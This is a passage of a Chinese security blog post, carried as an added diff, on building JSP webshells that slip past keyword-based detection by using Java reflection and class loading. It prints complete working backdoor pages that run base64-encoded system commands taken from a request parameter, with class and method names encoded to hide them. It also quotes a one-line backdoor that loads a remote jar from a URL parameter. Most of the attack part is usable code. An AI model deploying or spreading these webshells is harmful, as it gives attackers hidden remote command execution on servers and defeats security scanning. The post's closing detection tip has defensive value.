<span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在Runtime-reflect-cmd.jsp 脚本中：&lt;%! %&gt;标签里声明了用来执行系统命令的getPicture方法，&lt;% %&gt;标签里接受输入的命令，调用了getPicture方法，执行命令并返回结果&lt;%= %&gt;标签里输出系统命令执行结果到网页的&lt;pre&gt;标签对中。</p>
+<h4 id="二-反射ProcessBuilder"><a href="#二-反射ProcessBuilder" class="headerlink" title="二. 反射ProcessBuilder"></a>二. 反射ProcessBuilder</h4><p>查找资料，可以发现已有使用过Runtime反射后门的代码。那么既然可以反射Runtime，其实也可以构造出利用ProcessBuilder类start函数的jsp反射后门。</p>
+<p>以下后门代码命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/ProcessBuilder-reflect-cmd.jsp" target="_blank" rel="noopener">ProcessBuilder-reflect-cmd.jsp</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.List"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Encoder"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"sun.misc.BASE64Decoder"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line"></span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"Y21k"</span>)));</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2M="</span>)));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"L2Jpbi9iYXNo"</span>)));</span><br><span class="line">            list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"LWM="</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(<span class="keyword">new</span> String(decoder.decodeBuffer(str)));</span><br><span class="line">        Class PB = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"</span>)));</span><br><span class="line">        Process s = (Process) PB.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"c3RhcnQ="</span>))).invoke(PB.getDeclaredConstructors()[<span class="number">0</span>].newInstance(list));</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(s.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> encoder.encode(result.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    <span class="keyword">if</span>(query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        name = getPicture(query);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;%= name %&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ProcessBuilder-reflect-cmd.jsp脚本中，考虑到通用性、隐蔽性和对抗网页流量内容检测，用sun.misc包中的base64编码函数来处理了相关变量和内容。命令需要base64编码一下再提交，最后输出的内容需要base64解码：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjv50w8j30dz060gmc.jpg" alt="ProcessBuilder反射后门"></p>
+<p>其中关键的两行反射代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class PB = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy"</span>)));</span><br><span class="line">Process s = (Process) PB.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">"c3RhcnQ="</span>))).invoke(PB.getDeclaredConstructors()[<span class="number">0</span>].newInstance(list));</span><br></pre></td></tr></table></figure>
+
+<p>为了易于理解可以写成下面的示例代码供参考：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取ProcessBuilder的Class对象,PB</span></span><br><span class="line">Class PB = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>);</span><br><span class="line"><span class="comment">// 2. 从PB获取接受一个List类型变量作为参数的构造器对象,constructor</span></span><br><span class="line">Constructor constructor = PB.getConstructor(<span class="keyword">new</span> Class[]&#123;List<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">或</span><br><span class="line"><span class="comment">// 获得PB的第一个(也只有一个)构造器对象</span></span><br><span class="line">Constructor constructor = PB.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 3. 从PB获取一个名叫"start"的方法对象,m</span></span><br><span class="line">Method m = PB.getMethod(<span class="string">"start"</span>);</span><br><span class="line"><span class="comment">// 4. 提供给constructor需要的List类型变量值list(其中包含我们需要执行的命令)，获得一个实例对象obj</span></span><br><span class="line">Object obj = constructor.newInstance(list);</span><br><span class="line"><span class="comment">//5. 传入obj对象，调用m("start"方法)，执行系统命令</span></span><br><span class="line">Process process = (Process) m.invoke(obj);</span><br></pre></td></tr></table></figure>
+
+<h4 id="三-关于反射ProcessImpl"><a href="#三-关于反射ProcessImpl" class="headerlink" title="三. 关于反射ProcessImpl"></a>三. 关于反射ProcessImpl</h4><p>在”<strong>0x01：Java执行系统命令的方法和原理</strong>“部分讲了，ProcessImpl类不是public修饰的，不能从java.lang包外的地方直接访问。所以想要接触到ProcessImpl.start方法就要用到反射机制(需要setAccessible true)，反射最原始的ProcessImpl类的start方法，来执行系统命令。</p>
+<p>用代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line">Class Pi = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">Method[] methods = Pi.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods)&#123;</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    System.out.println(m.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以获得ProcessImpl.start方法的参数原型(JDK8)：</p>
+<p><code>static java.lang.Process java.lang.ProcessImpl.start(java.lang.String[],java.util.Map,java.lang.String,java.lang.ProcessBuilder$Redirect[],boolean) throws java.io.IOException</code></p>
+<p>或者跟踪到ProcessImpl类中，也可以直接观察需要的5个参数值类型：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjyrjosj30d204wq34.jpg" alt="ProcessImpl start函数构造"></p>
+<p>经<a href="https://github.com/0c0c0f" target="_blank" rel="noopener">@0c0c0f</a> 提醒， 其实反射java.lang.ProcessImpl类来执行代码，看起来要传入5个参数，实现起来其实也不复杂，完整代码示例如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.ProcessBuilder.Redirect;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">invoke_ProcessImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String op = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        String dir = <span class="string">"."</span>;</span><br><span class="line">        String[] cmdarray = <span class="keyword">new</span> String[]&#123;<span class="string">"ping"</span>, <span class="string">"127.0.0.1"</span>&#125;;</span><br><span class="line">        Map&lt;String, String&gt; environment = <span class="keyword">null</span>;</span><br><span class="line">        Redirect[] redirects = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> redirectErrorStream = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, Redirect[].class, boolean.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Process e = (Process) method.invoke(<span class="keyword">null</span>, cmdarray, environment, dir, redirects, redirectErrorStream);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">        System.out.print(op);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面代码中虽然成功通过反射 java.lang.ProcessImpl 类的start方法执行了系统命令，但引入了”ProcessBuilder” 关键字，所以只作为一种技术可行性来看待。在jdk6及以下版本，ProcessImpl start函数只需四个参数，可以避免引入”ProcessBuilder”关键字，通过反射执行系统命令。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk1v4hsj31me0k0q9y.jpg" alt="ProcessImpl jdk6 start函数构造"></p>
+<p>总之，想要通过Java反射机制来执行系统命令的话，一般就是通过<strong>反射Runtime类和ProcessBuilder类</strong>，调用相关系统命令执行方法来完成。</p>
+<p>其实到这里，利用Java的反射机制来绕过查杀软件检测已经讲的差不多了。但是查资料过程中，发现下面这段比较老的利用Java反射技术的后门代码：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Class.forName(<span class="string">"Load"</span>,<span class="keyword">true</span>,<span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">"u"</span>))&#125;)).getMethods()[<span class="number">0</span>].invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;request.getParameterMap()&#125;)%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用起来像这样</p>
+<p><code>http://target.com/reflect.jsp?u=http://somesite.com/some.jar&amp;password=A</code></p>
+<p>仔细看会发现：代码中的Class.forName()方法用了三个参数，而我们上面部分讲的代码中Class.forName()方法只用了一个参数。查阅API文档，发现Class.forName()方法是有两种形式，然后就注意到了Java类加载器ClassLoader和类加载机制。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk3e540j30lo09cq3n.jpg" alt="Class.forName"></p>
+<h3 id="0x05：使用Java类加载机制绕过检测"><a href="#0x05：使用Java类加载机制绕过检测" class="headerlink" title="0x05：使用Java类加载机制绕过检测"></a>0x05：使用Java类加载机制绕过检测</h3><p>Java类加载机制简单来说就是JVM查找到类的所在位置，并将找到的Java类的字节码装入内存，生成对应的Class对象。其中有几个重要的概念如下：</p>
+<h4 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h4><blockquote>
+<p>一个.java源码文件经过编译生成.class字节码文件，可以认为是Java编译器创建了一个可以被JVM识别并加载的Class对象。这个Class对象就可以看成是.class文件或者说Class对象被保存在了.class文件中。</p>
+</blockquote>
+<h4 id="Java自带的三个类加载器"><a href="#Java自带的三个类加载器" class="headerlink" title="Java自带的三个类加载器"></a>Java自带的三个类加载器</h4><ul>
+<li>Bootstrap Classloder </li>
+<li>Extention ClassLoader</li>
+<li>App ClassLoader</li>
+</ul>
+<p>上一级称为下一级的父加载器，加载的先后顺序依次是：</p>
+<p><code>Bootstrap Classloder =&gt; Extention ClassLoader =&gt; App ClassLoader</code></p>
+<p>对应的System.getProperty路径查找顺序：</p>
+<p><code>sun.boot.class.path =&gt; java.ext.dirs =&gt; java.class.path</code></p>
+<p>借用别人的一张图(<strong>双亲委托</strong>)简单说明类加载的过程：</p>
+<blockquote>
+<p>一个类加载器查找class和resource时，首先判断这个class是不是已经加载成功；如果没有的话它并不是自己进行查找，而是先委托给父加载器，然后递归委托，直到Bootstrap ClassLoader加载器；如果Bootstrap classloader找到了，直接返回class和resource；如果没有找到，则一级一级返回，最后才是自己去查找。</p>
+</blockquote>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk5sfknj30fa0hdach.jpg" alt="类加载"></p>
+<p>原理看起来比较复杂，实现起来其实比较简单，即将获得Class对象的方式由</p>
+<p><code>Class rt= Class.forName(&quot;java.lang.Runtime&quot;);</code> 改成</p>
+<p> <code>Class rt = ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</code>的形式即可，反射ProcessBuilder同理。</p>
+<p>其它一些特性如要深入了解请去查看具体代码实现，其它内容不再展开。</p>
+<h3 id="0x06：获得Class对象的四种方法"><a href="#0x06：获得Class对象的四种方法" class="headerlink" title="0x06：获得Class对象的四种方法"></a>0x06：获得Class对象的四种方法</h3><p>在以上文章中，其实我们大部分篇幅都是围绕着Java语言中获得Class对象的四种方法，构造绕过检测软件的执行系统命令的后门的。Java语言中获得Class对象的主要有以下四种方法：</p>
+<h5 id="原生类-class"><a href="#原生类-class" class="headerlink" title="原生类.class"></a>原生类.class</h5><p>即通过类、枚举、接口、注解或数组类型的原生类型名称.class，来获得Class对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="对象-getClass"><a href="#对象-getClass" class="headerlink" title="对象.getClass()"></a>对象.getClass()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime obj = java.lang.Runtime.getRuntime();</span><br><span class="line">Class c = obj.getClass();</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用-Class-forName"><a href="#使用-Class-forName" class="headerlink" title="使用 Class.forName()"></a>使用 Class.forName()</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class c= Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">或</span><br><span class="line">Class c = Class.forName(<span class="string">"java.lang.Runtime"</span>,<span class="keyword">false</span>,ClassLoader.getSystemClassLoader());</span><br></pre></td></tr></table></figure>
+
+<h5 id="使用-ClassLoader"><a href="#使用-ClassLoader" class="headerlink" title="使用 ClassLoader"></a>使用 ClassLoader</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c = ClassLoader.getSystemClassLoader().loadClass(<span class="string">"java.lang.Runtime"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>第一种和第二种方式显然无法规避Runtime等关键字获得Class对象；第三种使用Java反射机制和第四种使用Java类加载机制，都可以从全限定的类名字符串中获得Class对象，编码或变换下字符串的表现形式就可以规避Runtime等关键字，从而达到绕过软件检测的效果。</p>
+<h3 id="0x07：后记"><a href="#0x07：后记" class="headerlink" title="0x07：后记"></a>0x07：后记</h3><p>Java语言不像PHP等语言那么灵活，本文探讨的绕过检测的方法，尽量使用较少的代码量和文件，达到了<strong>规避Runtime、ProcessBuilder等关键字</strong>执行系统命令的效果，但其实在规避命令执行关键字的同时<strong>引入了Java反射和类加载机制相关的关键词</strong>。</p>
+<p>但是针对检测结果来说，用文中给的ProcessBuilder后门、0x04和0x05中给的新型后门，市面上一些仅利用脚本内容检测Webshell的软件和平台，都是检测不到异常的，其实这也从侧面印证了他们<strong>仅是通过关键词的匹配和已有恶意脚本库的比对</strong>等一些较为简单的方式来进行JSP相关的Webshell检测的。</p>
+<p>对于专业的查杀软件和平台，仅仅通过文章中关键字来做后门的检测和判断的标准，一棒子打死，是不能兼顾准确率和查杀效果的。但对于个人来说，只需要全局搜索代码中的”<strong>.invoke(</strong>“关键词，人工简单看下代码，就能判断是不是Java反射后门和Java类加载机制后门了。</p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="http://tutorials.jenkov.com/java-reflection/index.html" target="_blank" rel="noopener">http://tutorials.jenkov.com/java-reflection/index.html</a></p>
+<p><a href="https://docs.oracle.com/javase/7/docs/api/index.html?java/lang/reflect/package-summary.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/7/docs/api/index.html?java/lang/reflect/package-summary.html</a></p>
+<p><a href="https://blog.csdn.net/briblue/article/details/54973413" target="_blank" rel="noopener">https://blog.csdn.net/briblue/article/details/54973413</a></p>
+<p><a href="https://github.com/JustinSDK/JavaSE6Tutorial/blob/master/docs/CH16.md" target="_blank" rel="noopener">https://github.com/JustinSDK/JavaSE6Tutorial/blob/master/docs/CH16.md</a></p>
+<p><a href="https://stackoverflow.com/questions/8100376/class-forname-vs-classloader-loadclass-which-to-use-for-dynamic-loading" target="_blank" rel="noopener">https://stackoverflow.com/questions/8100376/class-forname-vs-classloader-loadclass-which-to-use-for-dynamic-loading</a></p>
+<p><a href="http://p2j.cn/?p=1627" target="_blank" rel="noopener">http://p2j.cn/?p=1627</a></p>
+<p><a href="https://segmentfault.com/a/1190000004706888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004706888</a></p>
+<p><a href="https://blog.csdn.net/zhangjg_blog/article/details/20380971" target="_blank" rel="noopener">https://blog.csdn.net/zhangjg_blog/article/details/20380971</a></p>
+<p><a href="https://segmentfault.com/a/1190000010162647?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010162647?utm_source=tuicool&amp;utm_medium=referral</a></p>
+<p><a href="https://stackoverflow.com/questions/6911427/is-it-possible-to-invoke-private-attributes-or-methods-via-reflection" target="_blank" rel="noopener">https://stackoverflow.com/questions/6911427/is-it-possible-to-invoke-private-attributes-or-methods-via-reflection</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/08/04/spring-webshell/" rel="next" title="基于内存webshell">
+                <i class="fa fa-chevron-left"></i> 基于内存webshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00：前言"><span class="nav-number">1.</span> <span class="nav-text">0x00：前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01：Java执行系统命令的方法和原理"><span class="nav-number">2.</span> <span class="nav-text">0x01：Java执行系统命令的方法和原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JVM层面"><span class="nav-number">2.1.</span> <span class="nav-text">JVM层面</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码层面"><span class="nav-number">2.2.</span> <span class="nav-text">代码层面</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：JSP标签"><span class="nav-number">3.</span> <span class="nav-text">0x02：JSP标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03：用ProcessBuilder绕过检测"><span class="nav-number">4.</span> <span class="nav-text">0x03：用ProcessBuilder绕过检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04：使用Java反射机制绕过检测"><span class="nav-number">5.</span> <span class="nav-text">0x04：使用Java反射机制绕过检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一-反射Runtime"><span class="nav-number">5.1.</span> <span class="nav-text">一. 反射Runtime</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二-反射ProcessBuilder"><span class="nav-number">5.2.</span> <span class="nav-text">二. 反射ProcessBuilder</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三-关于反射ProcessImpl"><span class="nav-number">5.3.</span> <span class="nav-text">三. 关于反射ProcessImpl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05：使用Java类加载机制绕过检测"><span class="nav-number">6.</span> <span class="nav-text">0x05：使用Java类加载机制绕过检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Class对象"><span class="nav-number">6.1.</span> <span class="nav-text">Class对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java自带的三个类加载器"><span class="nav-number">6.2.</span> <span class="nav-text">Java自带的三个类加载器</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06：获得Class对象的四种方法"><span class="nav-number">7.</span> <span class="nav-text">0x06：获得Class对象的四种方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#原生类-class"><span class="nav-number">7.0.1.</span> <span class="nav-text">原生类.class</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对象-getClass"><span class="nav-number">7.0.2.</span> <span class="nav-text">对象.getClass()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用-Class-forName"><span class="nav-number">7.0.3.</span> <span class="nav-text">使用 Class.forName()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用-ClassLoader"><span class="nav-number">7.0.4.</span> <span class="nav-text">使用 ClassLoader</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07：后记"><span class="nav-number">8.</span> <span class="nav-text">0x07：后记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接："><span class="nav-number">9.</span> <span class="nav-text">参考链接：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
